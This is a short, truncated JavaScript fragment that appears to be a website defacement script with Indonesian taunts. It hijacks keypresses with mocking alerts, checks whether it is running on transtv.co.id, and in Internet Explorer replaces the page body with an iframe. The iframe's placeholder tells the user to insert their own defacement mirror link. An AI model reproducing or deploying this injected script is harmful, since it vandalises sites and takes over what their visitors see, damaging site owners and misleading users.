...
function keypressed(){alert("Cekacekacekakakak :v");}
document.onkeydown=keypressed;
function kasih_tau(){
alert('You Lose , Zuhahahaha');
}
if(location.href.indexOf('transtv.co.id')==-1)setTimeout("alert('Isi alert terserah elu');",3000);
else setTimeout("kasih_tau()",3000);
if(navigator.userAgent.indexOf('MSIE')!=-1){
document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='Ganti dgn link hasil deface/mirror elu' height='620px' width='1100px' scrolling='no' frameborder='0'></center>";
}
else{
